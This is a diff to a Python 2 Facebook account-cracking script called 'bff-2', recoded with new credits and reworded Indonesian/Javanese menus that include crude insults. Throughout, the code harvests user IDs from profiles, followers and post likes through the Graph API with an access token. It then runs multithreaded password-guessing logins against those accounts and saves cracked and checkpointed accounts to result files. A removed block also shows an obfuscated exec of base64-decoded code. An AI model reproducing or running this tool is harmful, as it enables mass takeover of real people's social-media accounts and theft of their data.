@@ -17,7 +17,7 @@ ingfo = (
  - github      : github.com/Mark-Zuck
  - script name : bff-2
  - version     : 1.1
- 
+ - recode by :Fajar-Al
 %s"""%(Hj,Mt))
 
 import os
@@ -73,89 +73,17 @@ def folder():
 IP = requests.get('https://api.ipify.org').text
 def banner():
 	print (''' %s 
- © MAS RIYAN GANTENG%s
- 
+ © MAS FAJAR-AL%s
+                                          
 ███████████████████████████████████████████
 █▄─▄▄─██▀▄─████▄─▄██▀▄─██▄─▄▄▀█▄─▀─▄█▄─▄▄▀█
 ██─▄████─▀─██─▄█─███─▀─███─▄─▄██▀─▀███─██─█
 ▀▄▄▄▀▀▀▄▄▀▄▄▀▄▄▄▀▀▀▄▄▀▄▄▀▄▄▀▄▄▀▄▄█▄▄▀▄▄▄▄▀▀
- %s[%s*%s] By : %sMAS FAJAR
- %s[%s*%s] --------------------------------------
+         \/    \/ 
+ %s[%s*%s] By : %sRomi Afrizal
+ %s[%s*%s] Recode by :Fajar-Al
  [%s*%s] IP : %s%s
 '''%(H,K,H,K,H,K,H,K,H,K,P,K,P,H,P,K,P,K,P,H,IP))
-
-
-#!/usr/bin/python2
-# coding=utf-8
-# coding by Romi Afrizal
-# Note : jangan di ubah lagi! nanti error, script udah enak
-# Open source code team | ngotak dikit cok jangan jual di perjual belikan 
-
-Hj = '\x1b[1;92m' 
-Mt = '\x1b[0m' 
-ingfo = (
-"""%s
- • Info script :
- 	
- - author      : Romi Afrizal
- - facebook    : facebook.com/romi.afrizal.102
- - fanspage    : facebook.com/100022086172556
- - whatsap     : +6282371648186
- - github      : github.com/Mark-Zuck
- - script name : bff-2
- - version     : 1.1
- 
-%s"""%(Hj,Mt))
-
-import os
-try:
-    import requests
-except ImportError:
-    os.system('pip2 install requests')
-try:
-    import concurrent.futures
-except ImportError:
-    os.system('pip2 install futures')
-try:
-    import bs4
-except ImportError:
-    os.system('pip2 install bs4')
-    
-import requests, os, re, bs4, sys, json, time, random, datetime, subprocess, logging, base64
-from concurrent.futures import ThreadPoolExecutor 
-from bs4 import BeautifulSoup as parser
-from time import sleep as jeda
-from datetime import datetime
-exec(base64.b64decode('Y3QgPSBkYXRldGltZS5ub3coKQ0KbiA9IGN0Lm1vbnRoDQpidWxhbjEgPSB7IjAxIjogIkphbnVhcmkiLCAiMDIiOiAiRmVicnVhcmkiLCAiMDMiOiAiTWFyZXQiLCAiMDQiOiAiQXByaWwiLCAiMDUiOiAiTWVpIiwgIjA2IjogIkp1bmkiLCAiMDciOiAiSnVsaSIsICIwOCI6ICJBZ3VzdHVzIiwgIjA5IjogIlNlcHRlbWJlciIsICIxMCI6ICJPa3RvYmVyIiwgIjExIjogIk5vdmVtYmVyIiwgIjEyIjogIkRlc2VtYmVyIn0NCmJ1bGFuID0gWydKYW51YXJpJywgJ0ZlYnJ1YXJpJywgJ01hcmV0JywgJ0FwcmlsJywgJ01laScsICdKdW5pJywgJ0p1bGknLCAnQWd1c3R1cycsICdTZXB0ZW1iZXInLCAnT2t0b2JlcicsICdOb3ZlbWJlcicsICdEZXNlbWJlciddDQp0cnk6DQogICAgaWYgbiA8IDAgb3IgbiA+IDEyOg0KICAgICAgICBleGl0KCkNCiAgICBuVGVtcCA9IG4gLSAxDQpleGNlcHQgVmFsdWVFcnJvcjoNCiAgICBleGl0KCkNCg0KY3VycmVudCA9IGRhdGV0aW1lLm5vdygpDQp0YSA9IGN1cnJlbnQueWVhcg0KYnUgPSBjdXJyZW50Lm1vbnRoDQpoYSA9IGN1cnJlbnQuZGF5DQpvcCA9IGJ1bGFuW25UZW1wXQ0KcmVsb2FkKHN5cykNCnN5cy5zZXRkZWZhdWx0ZW5jb2RpbmcoJ3V0Zi04JykNCiMgS1VNUFVMQU4gV0FSTkENCk0gPSAnXHgxYlsxOzkxbScgIyBNRVJBSA0KSCA9ICdceDFiWzE7OTJtJyAjIEhJSkFVDQpLID0gJ1x4MWJbMTs5M20nICMgS1VOSU5HDQpCID0gJ1x4MWJbMTs5NG0nICMgQklSVQ0KVSA9ICdceDFiWzE7OTVtJyAjIFVOR1UNCk8gPSAnXHgxYlsxOzk2bScgIyBCSVJVIE1VREENClAgPSAnXHgxYlsxOzk3bScgIyBQVVRJSA0KTiA9ICdceDFiWzBtJyAjIFdBUk5BIE1BVEkNCmFjYWsgPSBbTSwgSCwgSywgQiwgVSwgTywgUF0NCndhcm5hID0gcmFuZG9tLmNob2ljZShhY2FrKQ0KdGlsID0i4oCiIg=='))
-
-ok = []
-cp = []
-id = []
-user = []
-loop = 0
-
-def jalan(z):
-    for e in z + '\n':
-        sys.stdout.write(e)
-        sys.stdout.flush();jeda(0.03)
-
-def tik():
-    titik = ['.   ','..  ','... ']
-    for o in titik:
-        print ('\r%s%s menghapus token %s'%(M,til,o)),
-        sys.stdout.flush();jeda(1)
-        
-def folder():
-	try:os.mkdir('hasil')
-	except:pass
-	try:os.mkdir('data')
-	except:pass
-	try:
-		ua_ = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
-		open("data/ua.txt","w").write(ua_)
-	except:
-		pass
-        
 
 # MASUK TOKEN (TOKEN LISTRIK)
 header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+ ;]", "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
@@ -200,7 +128,7 @@ def masuk():
     else:
     	print("%s [!] Isi yang benar kentod "%(M));exit()
 
-# IKI MENU MAS
+# MENU MAS
 def menu():
     os.system('clear')
     try:
@@ -216,19 +144,19 @@ def menu():
     except requests.exceptions.ConnectionError:
         exit("%s [!] Kesalahan koneksi "%(M))
     banner()
-    print (' %s[ monggo %s%s%s ] \n'%(P,K,nama,P))
-    print (' [%s01%s] Dump id sopo wae'%(K,P)) 
-    print (' [%s02%s] Dump id hambamu'%(K,P)) 
-    print (' [%s03%s] Dump id reaction postmu'%(K,P)) 
-    print (' [%s04%s] %sGass crack  %s'%(K,P,H,P)) 
-    print (' [%s05%s] Ganti Bojo'%(K,P)) 
-    print (' [%s06%s] Cek saldo bankmu'%(K,P)) 
+    print (' %s[ welcome %s%s%s ] \n'%(P,K,nama,P))
+    print (' [%s01%s] Dump id ngawor'%(K,P)) 
+    print (' [%s02%s] Dump id followers'%(K,P)) 
+    print (' [%s03%s] Dump id reaction post'%(K,P)) 
+    print (' [%s04%s] %sGas crack%s'%(K,P,H,P)) 
+    print (' [%s05%s] Ganti user agent'%(K,P)) 
+    print (' [%s06%s] Cek hasil crack'%(K,P)) 
     #print (' [%s07%s] Gabung group'%(K,P))
     #print (' [%s08%s] Info script'%(K,P))
-    print (' [%s00%s] metu (hapus token)'%(M,P))
+    print (' [%s00%s] Metu (hapus token)'%(M,P))
     unik = raw_input('\n%s [?] Menu : %s'%(P,K))
     if unik == '':
-        print("%s [!] mbok senh genah to mas "%(M));jeda(2);menu()
+        print("%s [!] Isi seng bener mass "%(M));jeda(2);menu()
     elif unik in['1','01']:
         publik(romz)
     elif unik in['2','02']:
@@ -246,13 +174,13 @@ def menu():
             for file in dirs:
                 print("%s -> %s%s"%(K,P,file));jeda(0.2)
             print("\n %s[%s!%s] cth : CP-%s-%s-%s%s"%(P,M,P,ha,op,ta,".txt"))
-            file = raw_input("%s [?] masukan file : "%(P));jeda(0.2)
+            file = raw_input("%s [?] lebokno file : "%(P));jeda(0.2)
             if file == "":
-                print("%s [!] file tidak ada "%(M))
+                print("%s [!] file e renek "%(M))
             total = open("hasil/%s"%(file)).read().splitlines()
             print(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
             nm_file = ("%s"%(file)).replace("-", " ")
-            jalan(" [%s*%s] total akun : %s"%(K,P,len(total)))
+            jalan(" [%s*%s] total e kabeh : %s"%(K,P,len(total)))
             print(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
             for akun in total:
             	fb = akun.replace("\n","")
@@ -296,20 +224,20 @@ def publik(romz,headers=header):
             sys.stdout.flush();jeda(0.0050)
 
         bff.close()
-        print ('\n\n %s[%s√%s] Wes rampung dump id seko %s%s'%(P,H,P,H,nm['name']))
-        print ('%s [%s√%s] File dump kesimpen :%s %s '%(P,H,P,H,file))
+        print ('\n\n %s[%s√%s] Succes dump id dari %s%s'%(P,H,P,H,nm['name']))
+        print ('%s [%s√%s] File dump tersimpan :%s %s '%(P,H,P,H,file))
         raw_input('\n%s [ %senter %s] '%(P,K,P))
         menu()
     except Exception as e:
-        exit('\n %s[!] gagal mas dump id'%(P))
+        exit('\n %s[!] gagal dump id'%(P))
 
-# DUMP FL/PENGIKUTMU 
+# DUMP FOLLOWERS
 def followers(romz,headers=header):
     try:
         os.mkdir('dump')
     except:pass
     try:
-    	print ("\n%s [%s!%s] Ketik '%sme%s' jika ingin dump followers sendiri "%(P,M,P,H,P))
+    	print ("\n%s [%s!%s] Ketik '%sme%s' pencet s nek pengen dump fl dewe "%(P,M,P,H,P))
         idt = raw_input(' [*] Target id : %s'%(K))
         batas = raw_input(' %s[*] Maximal id : %s'%(P,K))
         gas = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,romz))
@@ -321,7 +249,7 @@ def followers(romz,headers=header):
         for a in z['data']:
             id.append(a['id'] + '<=>' + a['name'])
             bff.write(a['id'] + '<=>' + a['name'] + '\n')
-            print '\r%s [*] tunggu dilit id :%s %s ' % (P,H,str(len(id))),
+            print '\r%s [*] mengumpulkan id :%s %s ' % (P,H,str(len(id))),
             sys.stdout.flush();jeda(0.0050)
 
         bff.close()
@@ -332,13 +260,13 @@ def followers(romz,headers=header):
     except Exception as e:
         exit('\n %s[!] gagal dump id'%(P))
   
-# DUMP SEKO POSTINGAN 
+# DUMP POSTINGAN 
 def postingan(romz,headers=header):
     try:
         os.mkdir('dump')
     except:pass
     try:
-    	print ("\n%s [%s!%s] Perlu di ingat postingan wajib publik "%(P,M,P))
+    	print ("\n%s [%s!%s] He cok postingan e kudu publik "%(P,M,P))
         idt = raw_input(' [*] Id post   : %s'%(K))
         simpan = raw_input(' %s[?] Nama file : %s'%(P,K))
         r = requests.get('https://graph.facebook.com/%s/likes?limit=999999&access_token=%s'%(idt,romz))
@@ -361,7 +289,7 @@ def postingan(romz,headers=header):
         exit('\n %s[!] gagal dump id'%(P))
 
 
-# GAS CRACK MAS
+# START CRACK
 class ngentod:
 
     def __init__(self):
@@ -369,17 +297,17 @@ class ngentod:
 
     def romiy(self):
         try:
-            self.apk = raw_input('\n %s[?] file dump :%s '%(P,K))
+            self.apk = raw_input('\n %s[?] file seng mbok dump mau :%s '%(P,K))
             self.id = open(self.apk).read().splitlines()
             print '%s [%s*%s] jumlah id : %s%s' %(P,K,P,H,len(self.id))
         except:
-            print '\n%s [!] File dump tidak ada, dump id dulu kentod'%(M)
+            print '\n%s [!] File dump renek,dump dulu bangsul'%(M)
             raw_input('\n%s [ %senter %s] '%(P,K,P));menu()
-        unikers = raw_input('%s [?] arep nanggo pw manual ora mas? [y/t] :%s '%(P,K))
+        unikers = raw_input('%s [?] pengen nanggo pasword manual ? [y/t] :%s '%(P,K))
         if unikers in ('Y', 'y'):
             print '\n %s[%s!%s] cth : %ssayang,anjing%s gunakan , (koma) untuk pemisah '%(P,M,P,H,P)
             while True:
-                pwx = raw_input(' %s[?] set password :%s '%(P,K))
+                pwx = raw_input(' %s[?] isi pasword sak pengenmu :%s '%(P,K))
                 if pwx == '':
                     print '\n %s[!] jangan kosong '%(M)
                 elif len(pwx)<=5:
@@ -391,7 +319,7 @@ class ngentod:
                             print("%s [!] Isi yang benar kentod "%(M));self.zona()
                         elif ind in ('1', '01'):
                             print '\n %s[%s*%s] akun %sOK%s kesimpen neng >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
-                            print '%s [%s*%s] akun %sCP %kesimpen neng > %shasil/CP-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
+                            print '%s [%s*%s] akun %sCP %skesimpen neng > %shasil/CP-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
                             with ThreadPoolExecutor(max_workers=30) as log:
                                 for akun in self.id:
                                     try:
@@ -409,7 +337,7 @@ class ngentod:
                                         log.submit(self.basic, indo, zafi_)
                                     except: pass
                             os.remove(self.apk);exit()
-                        elif ind in ('2', '03'):
+                        elif ind in ('3', '03'):
                             print '\n %s[%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                             print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
                             with ThreadPoolExecutor(max_workers=30) as log:
@@ -420,11 +348,11 @@ class ngentod:
                                     except: pass
                             os.remove(self.apk);exit()
                         else:
-                            print '\n %s[!] isi yang benar kentod'%(M);self.zona()
-                    print '\n%s [ dipilih mas methode crack - cobanen siji² ]\n'%(P)
-                    print ' [%s01%s] methode b-api (crack balap)'%(K,P)
-                    print ' [%s02%s] methode mbasic (crack suwi)'%(K,P)
-                    print ' [%s03%s] methode mobile (crack suwi banget) wah iki rekomendasi hasil cp ngurang tpi langsung tap yes mergane tak dongani sek'%(K,P)
+                            print ('\n %s[!] isi yang benar kentod'%(M));zona()
+                    print '\n%s [ pilih methode crack - monggo dicoba siji² ]\n'%(P)
+                    print ' [%s01%s] methode b-api (crack ngacir)'%(K,P)
+                    print ' [%s02%s] methode mbasic (crack santai)'%(K,P)
+                    print ' [%s03%s] methode mobile (crack lemot) walapun lemot tapi hasilnya banyak lan tap yes'%(K,P)
                     zona(pwx.split(','))
                     break
         elif unikers in ('T', 't'):
@@ -489,7 +417,7 @@ class ngentod:
                         pass
             os.remove(self.apk);exit()
         else:
-            print("%s [!] Isi yang benar kentod "%(M));self.langsung()
+            print("\n%s [!] Isi yang benar kentod "%(M));self.langsung()
 
     def b_api(self, user, zona):
     	try:
@@ -655,11 +583,11 @@ class ngentod:
         print('\r %s*--> %s/%s OK-:%s - CP-:%s '%(P,loop,len(self.id),len(ok),len(cp))),
         sys.stdout.flush()
         
-# KENE GANTI USER AGENT
+# GANTI USER AGENT
 def useragent():
-	print ("\n%s [%s01%s] Ganti Bojo "%(P,K,P))
-	print (" [%s02%s] Cek Bojomu "%(K,P))
-	print (" [%s00%s] Bali adoh "%(M,P))
+	print ("\n%s [%s01%s] Ganti bojo "%(P,K,P))
+	print (" [%s02%s] Cek bojomu "%(K,P))
+	print (" [%s00%s] Bali "%(M,P))
 	uas()
 	
 def uas():
@@ -681,7 +609,7 @@ def uas():
                 open("data/ua.txt","w").write(ua_)
                 print ("\n%s [√] menggunakan user agent bawaan"%(H));jeda(2);menu()
             open("data/ua.txt","w").write(ua);jeda(2)
-            print ("\n%s [√] yeee user agent wes diganti karo mbak oci"%(H));jeda(2);menu()
+            print ("\n%s [√] kapok bojomu wes diganti"%(H));jeda(2);menu()
         except KeyboardInterrupt:
 			exit ("\x1b[1;91m [!] Error ") 
     elif u in("2","02"):
